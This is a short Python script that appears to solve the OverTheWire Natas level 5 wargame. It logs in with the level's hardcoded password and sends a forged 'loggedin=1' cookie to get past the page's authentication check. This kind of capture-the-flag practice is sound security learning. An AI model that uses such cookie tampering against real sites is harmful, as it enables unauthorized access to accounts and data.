#!/usr/bin/python3

import requests
import re

user = "natas5"
pwd = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"
url = "http://%s.natas.labs.overthewire.org/" % user

cookies = {"loggedin": "1"}
session = requests.Session()
print(session)

response = session.get(url, auth=(user, pwd), cookies=cookies)
print(response.text)
